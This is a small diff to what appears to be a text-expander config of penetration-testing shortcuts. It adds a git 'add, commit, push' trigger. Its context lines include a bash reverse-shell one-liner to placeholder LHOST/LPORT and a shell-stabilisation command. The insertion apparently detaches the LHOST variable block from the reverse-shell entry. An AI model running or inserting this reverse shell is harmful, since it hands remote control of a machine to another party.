@@ -5,6 +5,8 @@ matches:
     replace: "stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm; stty rows 80 columns 173; reset;"
   - trigger: ":rev-bash"
     replace: "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+  - trigger: ":dotpush"
+    replace: "git add .; git commit -m '.'; git push"
     vars:
       - name: LHOST
         type: shell
